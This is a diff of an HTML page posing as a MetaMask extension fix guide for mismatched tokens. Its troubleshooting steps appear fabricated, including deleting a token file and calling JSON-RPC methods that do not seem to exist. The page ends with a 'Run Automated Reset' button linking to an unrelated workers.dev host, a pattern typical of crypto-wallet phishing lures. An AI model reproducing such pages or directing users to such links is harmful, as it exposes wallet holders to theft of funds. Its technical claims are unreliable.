@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Manage Tokens Miss Match With Net – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,30 @@
 <h1>Metamask Extension Bug Assets Manage Tokens Miss Match With Net</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a mismatch between the tokens listed in the Metamask extension's "Manage Tokens" section and the network filter, resulting in incorrect or missing tokens being displayed.</li>
+<li>Users experience a mismatch between the tokens listed in the Metamask extension's "Assets" section and the tokens available on the current Ethereum network, leading to difficulties in managing tokens.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a desynchronization between the Metamask extension's internal token registry and the Ethereum network's token listings, often caused by outdated extension versions, incorrect network configurations, or corrupted token data.</li>
+<li>The error occurs due to a bug in the Metamask extension's token management system, which fails to properly filter tokens based on the currently selected Ethereum network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Reset the Metamask extension's token registry by deleting the <code>tokenRegistry.json</code> file</li>
-<li>Update the Metamask extension to the latest version and restart the browser</li>
-<li>Run the following command to manually refresh the token listings:</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Reset the token list by deleting the <code>tokenList.json</code> file</li>
+<li>Use the following command to manually update the token list:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>--data<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_tokenRefresh&quot;,&quot;params&quot;:[]}&#39;</span><span class="w"> </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_token_list&quot;,&quot;params&quot;:[],&quot;id&quot;:1}&#39;</span><span class="w"> </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and token management capabilities.</p>
+<p>Consider utilizing an external console for more complex token management tasks.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Ethereum network connection established</li>
+<li>Ethereum network selected and connected</li>
 <li>Basic understanding of JSON-RPC commands and token management</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
